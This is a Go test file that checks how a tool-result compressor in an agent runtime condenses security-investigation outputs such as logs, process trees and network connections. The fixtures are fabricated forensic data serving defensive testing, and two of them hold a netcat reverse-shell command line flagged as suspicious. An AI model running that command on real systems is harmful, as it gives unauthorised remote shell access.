package contextbudget

import (
	"fmt"
	"strings"
	"testing"

	"github.com/chenchen511/agent-runtime/core"
)

func TestToolCompressor_QueryHistoricalLogs_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	// Generate enough data to exceed maxToolResultTokens (2000 tokens ~ 8000 chars)
	var logs []string
	for i := 0; i < 200; i++ {
		day := i%28 + 1
		logs = append(logs, fmt.Sprintf(`{"timestamp": "2026-05-%02dT10:00:00Z", "pid": %d, "message": "routine log entry number %d with some additional padding text"}`, day, 1000+i, i))
	}
	anomalousJSON := `[{"timestamp": "2026-05-01T10:00:00Z", "pid": 1234, "message": "failed auth from 192.168.1.100"}, {"timestamp": "2026-05-05T14:30:00Z", "pid": 5678, "message": "sudo without password"}]`
	input := fmt.Sprintf(`{
		"tool_call_id": "tool-123",
		"tool_name": "QueryHistoricalLogs",
		"time_range": "2026-05-01 to 2026-05-11",
		"hit_count": 1500,
		"key_timeline": ["2026-05-01T10:00:00Z suspicious login", "2026-05-05T14:30:00Z privilege escalation"],
		"anomalous_logs": %s,
		"total_lines": 50000,
		"routine_lines": 49900,
		"all_logs": [%s]
	}`, anomalousJSON, strings.Join(logs, ","))

	msg := core.LLMMessage{
		Role:    "tool",
		Content: input,
	}

	compressed := tc.CompressToolResult(msg, "QueryHistoricalLogs")

	if !strings.Contains(compressed, "tool-123") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "QueryHistoricalLogs") {
		t.Error("Compressed result should contain tool name")
	}
	if !strings.Contains(compressed, "time_range") {
		t.Error("Compressed result should preserve time_range")
	}
	if !strings.Contains(compressed, "hit_count") {
		t.Error("Compressed result should preserve hit_count")
	}
	if !strings.Contains(compressed, "anomalous_logs") {
		t.Error("Compressed result should preserve anomalous_logs")
	}
	// Should be shorter than original
	if len(compressed) >= len(input) {
		t.Errorf("Compressed (%d chars) should be shorter than original (%d chars)", len(compressed), len(input))
	}
}

func TestToolCompressor_GetProcessTree_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-456",
		"tool_name": "GetProcessTree",
		"processes": [
			{"pid": 1, "ppid": 0, "name": "init", "user": "root", "cmdline": "/sbin/init"},
			{"pid": 1234, "ppid": 1, "name": "sshd", "user": "root", "cmdline": "/usr/sbin/sshd"},
			{"pid": 5678, "ppid": 1234, "name": "bash", "user": "admin", "cmdline": "bash"},
			{"pid": 9999, "ppid": 5678, "name": "nc", "user": "admin", "cmdline": "nc -e /bin/bash 192.168.1.100 4444"}
		],
		"suspicious": [
			{"pid": 9999, "reason": "reverse shell pattern"}
		]
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetProcessTree")

	if !strings.Contains(compressed, "tool-456") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "suspicious") {
		t.Error("Compressed result should preserve suspicious processes")
	}
	if !strings.Contains(compressed, "nc") {
		t.Error("Compressed result should preserve suspicious process details")
	}
}

func TestToolCompressor_GetNetworkConnections_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-789",
		"tool_name": "GetNetworkConnections",
		"connections": [
			{"local": "0.0.0.0:22", "remote": "192.168.1.100:54321", "state": "ESTABLISHED", "pid": 1234},
			{"local": "0.0.0.0:80", "remote": "10.0.0.1:12345", "state": "ESTABLISHED", "pid": 5678},
			{"local": "192.168.1.50:4444", "remote": "192.168.1.100:9999", "state": "ESTABLISHED", "pid": 9999}
		],
		"listening_ports": [22, 80, 443],
		"anomalous_outbound": [
			{"remote": "192.168.1.100:9999", "reason": "unusual port"}
		]
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetNetworkConnections")

	if !strings.Contains(compressed, "tool-789") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "anomalous_outbound") {
		t.Error("Compressed result should preserve anomalous connections")
	}
	if !strings.Contains(compressed, "listening_ports") {
		t.Error("Compressed result should preserve listening ports")
	}
}

func TestToolCompressor_GetOpenFiles_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-101",
		"tool_name": "GetOpenFiles",
		"files": [
			{"path": "/etc/passwd", "type": "config", "pid": 1234},
			{"path": "/tmp/suspicious.sh", "type": "executable", "pid": 5678},
			{"path": "/var/log/auth.log", "type": "log", "pid": 9999},
			{"path": "/home/user/file1.txt", "type": "regular", "pid": 1111},
			{"path": "/home/user/file2.txt", "type": "regular", "pid": 2222}
		],
		"sensitive_paths": ["/etc/passwd", "/etc/shadow"],
		"temp_files": ["/tmp/suspicious.sh"],
		"deleted_files": ["/tmp/evidence.log"],
		"total_count": 5
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetOpenFiles")

	if !strings.Contains(compressed, "tool-101") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "sensitive_paths") {
		t.Error("Compressed result should preserve sensitive paths")
	}
	if !strings.Contains(compressed, "temp_files") {
		t.Error("Compressed result should preserve temp files")
	}
	if !strings.Contains(compressed, "deleted_files") {
		t.Error("Compressed result should preserve deleted files")
	}
}

func TestToolCompressor_GetRunningProcesses_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-202",
		"tool_name": "GetRunningProcesses",
		"processes": [
			{"pid": 1, "name": "init", "user": "root", "cmdline": "/sbin/init", "parent": 0},
			{"pid": 1234, "name": "sshd", "user": "root", "cmdline": "/usr/sbin/sshd", "parent": 1},
			{"pid": 5678, "name": "bash", "user": "admin", "cmdline": "bash", "parent": 1234},
			{"pid": 9999, "name": "nc", "user": "admin", "cmdline": "nc -e /bin/bash", "parent": 5678}
		],
		"suspicious": [
			{"pid": 9999, "reason": "reverse shell"}
		],
		"total_count": 4
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetRunningProcesses")

	if !strings.Contains(compressed, "tool-202") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "suspicious") {
		t.Error("Compressed result should preserve suspicious processes")
	}
	if !strings.Contains(compressed, "nc") {
		t.Error("Compressed result should preserve suspicious process details")
	}
}

func TestToolCompressor_GetUserSessions_JSON(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-303",
		"tool_name": "GetUserSessions",
		"sessions": [
			{"user": "admin", "source_ip": "192.168.1.100", "login_time": "2026-05-11T08:00:00Z", "tty": "pts/0", "active": true},
			{"user": "root", "source_ip": "10.0.0.1", "login_time": "2026-05-11T09:00:00Z", "tty": "pts/1", "active": true},
			{"user": "nobody", "source_ip": "127.0.0.1", "login_time": "2026-05-10T12:00:00Z", "tty": "pts/2", "active": false}
		],
		"total_count": 3
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetUserSessions")

	if !strings.Contains(compressed, "tool-303") {
		t.Error("Compressed result should contain tool_call_id")
	}
	if !strings.Contains(compressed, "admin") {
		t.Error("Compressed result should preserve user sessions")
	}
	if !strings.Contains(compressed, "192.168.1.100") {
		t.Error("Compressed result should preserve source IPs")
	}
}

func TestToolCompressor_UnknownTool_TextFallback(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	// Non-JSON content that's not a known tool
	input := "This is a plain text result from an unknown tool with some data that should be truncated if too long"

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "UnknownTool")

	// Should still return something (truncated or original)
	if len(compressed) == 0 {
		t.Error("Compressed result should not be empty")
	}
}

func TestToolCompressor_InvalidJSON_TextFallback(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{invalid json content that cannot be parsed`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "QueryHistoricalLogs")

	// Should fall back to text compression
	if len(compressed) == 0 {
		t.Error("Compressed result should not be empty even with invalid JSON")
	}
}

func TestToolCompressor_ShortContent_Unchanged(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{"result": "ok"}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetProcessTree")

	// Short content should not be compressed
	if compressed != input {
		t.Errorf("Short content should remain unchanged, got %q", compressed)
	}
}

func TestToolCompressor_PreservesToolCallID(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	input := `{
		"tool_call_id": "tool-unique-id-12345",
		"tool_name": "GetNetworkConnections",
		"connections": [
			{"local": "0.0.0.0:22", "remote": "192.168.1.100:54321", "state": "ESTABLISHED", "pid": 1234},
			{"local": "0.0.0.0:80", "remote": "10.0.0.1:12345", "state": "ESTABLISHED", "pid": 5678}
		],
		"listening_ports": [22, 80, 443],
		"anomalous_outbound": []
	}`

	msg := core.LLMMessage{Role: "tool", Content: input}
	compressed := tc.CompressToolResult(msg, "GetNetworkConnections")

	if !strings.Contains(compressed, "tool-unique-id-12345") {
		t.Error("Compressed result must preserve tool_call_id")
	}
}

func TestToolCompressor_TextCompression_TruncatesLong(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	// Create a long text that exceeds maxToolResultTokens
	longText := strings.Repeat("This is a line of output from the tool.\n", 1000)

	compressed := tc.compressText(longText, 500) // 500 tokens max

	// Should be truncated
	if len(compressed) >= len(longText) {
		t.Error("Long text should be truncated")
	}
	if !strings.Contains(compressed, "truncated") {
		t.Error("Truncated text should contain 'truncated' indicator")
	}
}

func TestToolCompressor_TextCompression_ShortUnchanged(t *testing.T) {
	estimator := NewDefaultEstimator()
	tc := NewToolCompressor(estimator)

	shortText := "Short output"

	compressed := tc.compressText(shortText, 500)

	if compressed != shortText {
		t.Errorf("Short text should remain unchanged, got %q", compressed)
	}
}
